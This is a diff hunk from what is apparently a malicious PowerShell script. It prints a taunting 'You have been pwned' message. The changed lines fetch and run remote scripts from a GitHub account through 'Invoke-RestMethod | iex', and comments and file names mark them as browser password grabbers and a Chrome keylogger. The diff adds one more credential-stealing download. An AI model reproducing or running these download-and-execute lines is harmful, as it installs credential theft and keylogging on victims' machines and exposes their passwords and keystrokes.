@@ -315,7 +315,8 @@ if ($removeTraces) {
 
 Write-Output "✨ You have been pwned lmaooo :3 :3"
 # Grab pass browserpassview
-Invoke-RestMethod https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1 | iex
-Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/Chrome80Dp.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/WbGrab.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/CreadbrowDown.ps1 | iex
 # keylogchrome
 Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
